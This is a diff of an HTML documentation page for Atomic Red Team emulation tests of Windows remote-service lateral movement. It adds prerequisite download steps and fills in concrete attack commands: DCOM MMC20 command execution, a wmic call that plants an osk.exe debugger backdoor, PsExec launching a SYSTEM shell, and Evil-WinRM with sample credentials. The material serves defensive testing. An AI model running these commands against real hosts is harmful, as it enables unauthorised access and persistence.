@@ -390,6 +390,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-none">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         None
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
+         Description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id2">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -424,7 +452,50 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id4">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-computer-must-have-ruby-installed">
+         Description: Computer must have Ruby Installed
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Get Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-computer-must-have-evil-winrm-installed">
+         Description: Computer must have Evil-WinRM installed
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id6">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id7">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id8">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -470,7 +541,8 @@
 <h3>Atomic Test #1 - Enable Windows Remote Management<a class="headerlink" href="#atomic-test-1-enable-windows-remote-management" title="Permalink to this headline">¶</a></h3>
 <p>Powershell Enable WinRM</p>
 <p>Upon successful execution, powershell will “Enable-PSRemoting” allowing for remote PS access.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Enable-PSRemoting</span> <span class="n">-Force</span>
@@ -494,7 +566,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.application&quot;</span><span class="p">,</span><span class="s2">&quot;#{computer_name}&quot;</span><span class="p">)).</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;c:\windows\system32\calc.exe&quot;</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">)</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.application&quot;</span><span class="p">,</span><span class="s2">&quot;computer1&quot;</span><span class="p">)).</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;c:\windows\system32\calc.exe&quot;</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -513,7 +585,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create &quot;C:\Windows\system32\reg.exe add \&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\&quot; /v \&quot;Debugger\&quot; /t REG_SZ /d \&quot;cmd.exe\&quot; /f&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:Target process call create &quot;C:\Windows\system32\reg.exe add \&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\&quot; /v \&quot;Debugger\&quot; /t REG_SZ /d \&quot;cmd.exe\&quot; /f&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -530,9 +602,39 @@
 <p>Utilize psexec to start remote process.</p>
 <p>Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-none">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
+<h5>Description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})<a class="headerlink" href="#description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if (Test-Path &quot;C:\PSTools\PsExec.exe&quot;) { exit 0} else { exit 1}
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest &quot;https://download.sysinternals.com/files/PSTools.zip&quot; -OutFile &quot;$env:TEMP\PsTools.zip&quot;
+Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+New-Item -ItemType Directory (&quot;C:\PSTools\PsExec.exe&quot;) -Force | Out-Null
+Copy-Item $env:TEMP\PsTools\PsExec.exe &quot;C:\PSTools\PsExec.exe&quot; -Force
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>#{psexec_exe} \\#{computer_name} -accepteula -u #{user_name} -p #{password} -s cmd.exe
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\PSTools\PsExec.exe \\localhost -accepteula -u DOMAIN\Administrator -p P@ssw0rd1 -s cmd.exe
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -551,7 +653,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id3">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">invoke-command</span> <span class="n">-ComputerName</span> <span class="c">#{host_name} -scriptblock {#{remote_command}}</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">invoke-command</span> <span class="n">-ComputerName</span> <span class="n">localhost</span> <span class="n">-scriptblock</span> <span class="p">{</span><span class="n">ipconfig</span><span class="p">}</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -566,10 +668,53 @@
 <div class="section" id="atomic-test-6-winrm-access-with-evil-winrm">
 <h3>Atomic Test #6 - WinRM Access with Evil-WinRM<a class="headerlink" href="#atomic-test-6-winrm-access-with-evil-winrm" title="Permalink to this headline">¶</a></h3>
 <p>An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled
-<strong>Supported Platforms:</strong> windows</p>
+<strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-computer-must-have-ruby-installed">
+<h5>Description: Computer must have Ruby Installed<a class="headerlink" href="#description-computer-must-have-ruby-installed" title="Permalink to this headline">¶</a></h5>
+</div>
 <div class="section" id="id4">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="c">#{destination_address} -u #{user_name} -p #{password}```</span>
+<h5>Check Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">ruby</span> <span class="n">-v</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id5">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest  -OutFile $env:Temp\rubyinstaller-2.7.1-1-x64.exe https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
+$file1= $env:Temp + &quot;\rubyinstaller-2.7.1-1-x64.exe&quot;
+Start-Process $file1 /S;
+</pre></div>
+</div>
+</div>
+<div class="section" id="description-computer-must-have-evil-winrm-installed">
+<h5>Description: Computer must have Evil-WinRM installed<a class="headerlink" href="#description-computer-must-have-evil-winrm-installed" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id6">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">evil-winrm</span> <span class="n">-h</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id7">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">gem</span> <span class="n">install</span> <span class="n">evil-winrm</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id8">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="n">Target</span> <span class="n">-u</span> <span class="n">Domain</span><span class="p">\</span><span class="n">Administrator</span> <span class="n">-p</span> <span class="n">P</span><span class="nv">@ssw0rd1</span><span class="p">```</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
